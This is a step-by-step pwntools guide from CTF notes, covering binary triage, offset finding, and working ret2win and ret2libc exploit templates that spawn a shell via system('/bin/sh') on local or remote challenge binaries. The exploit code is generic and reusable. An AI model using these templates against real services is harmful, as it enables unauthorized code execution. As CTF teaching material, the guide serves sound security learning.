# pwntools — Step-by-Step Guide

Practical workflow for a PWN exploit with pwntools, from recon to a remote shell. Concepts in
`1. Fundamentos e Quando Usar.md`.

## 0. Install

```bash
# Arch (Python externally-managed — use the official package, not pip):
sudo pacman -S --needed python-pwntools checksec
# one_gadget (optional, for a tight ret2libc):
gem install one_gadget || yay -S one_gadget
```
On this host it's already installed via `pacman`; `from pwn import *` runs with `python3` directly
or inside `~/ctf-venv` (created with `--system-site-packages`).

## 1. Triage the binary

```bash
file ./chall && checksec ./chall
```
Read from the `checksec` output:
- **Canary** absent → you can overwrite the return address directly.
- **NX enabled** → no shellcode execution on the stack; use ROP/ret2libc.
- **PIE** → the binary's addresses are randomized; you need a leak before using symbols.
- **RELRO** → `Full RELRO` prevents overwriting the GOT.

Decompile in Ghidra to find the vulnerable function, the buffer size, and any hidden function
(`win`/`system`/`flag`).

## 2. Exploit skeleton (reuse it every time)

```python
from pwn import *
context.binary = elf = ELF("./chall")
context.log_level = "info"            # "debug" when you need to see the bytes

def start():
    if args.REMOTE:                   # run: python expl.py REMOTE
        return remote("HOST", 1337)
    return process(elf.path)

io = start()
```

## 3. Find the offset to the return address

```python
io = process(elf.path)
io.sendline(cyclic(200))
io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 8))    # 64-bit
log.success(f"offset = {offset}")
```

## 4a. ret2win (a target function exists)

```python
payload = flat({offset: elf.sym["win"]})
# if the shell opens and closes immediately, insert a 'ret' to align the stack (see step 6):
# payload = flat({offset: [ret_gadget, elf.sym["win"]]})
io.sendline(payload)
io.interactive()
```

## 4b. ret2libc (leak + 2nd stage)

```python
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret     = rop.find_gadget(["ret"])[0]

# stage 1: leak puts@GOT via puts@PLT, return to main
io.sendline(flat({offset: [pop_rdi, elf.got["puts"], elf.plt["puts"], elf.sym["main"]]}))
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc = ELF("./libc.so.6"); libc.address = leak - libc.sym["puts"]
log.success(f"libc base = {hex(libc.address)}")

# stage 2: system("/bin/sh")  — an extra 'ret' aligns the stack for system's movaps
binsh = next(libc.search(b"/bin/sh"))
io.sendline(flat({offset: [ret, pop_rdi, binsh, libc.sym["system"]]}))
io.interactive()
```

Without the target's libc: take the last byte-and-a-half of the leak (the page offset) and identify
the version at https://libc.rip; download/patch with `pwninit`.

## 5. Interacting with a remote service (NET / rounds / PoW)

```python
io = remote("HOST", PORT)
io.recvuntil(b"> ")
io.sendline(b"payload")
# typical PoW: find a suffix such that sha256(challenge+suffix) starts with N zeros
import itertools, hashlib
chal = io.recvline().split()[-1]       # extract according to the actual format
for i in itertools.count():
    s = str(i).encode()
    if hashlib.sha256(chal + s).hexdigest().startswith("0000"):
        io.sendline(s); break
```

## 6. Execution gotchas

- **Stack alignment (x86-64):** `system` uses `movaps`, which requires RSP to be a multiple of 16.
  A shell that "closes immediately" → add a lone `ret` gadget before the call.
- **Local libc ≠ remote:** test with the challenge's libc (`pwninit` / `LD_PRELOAD=./libc.so.6
  ./ld.so ./chall`), otherwise the `system`/`/bin/sh` offsets won't match on the remote.
- **32-bit:** arguments on the stack (`[func, ret, arg1, arg2]`), not via registers.
- **`sendline` already adds `\n`** — don't duplicate it; use `recvuntil(prompt)` to synchronize.
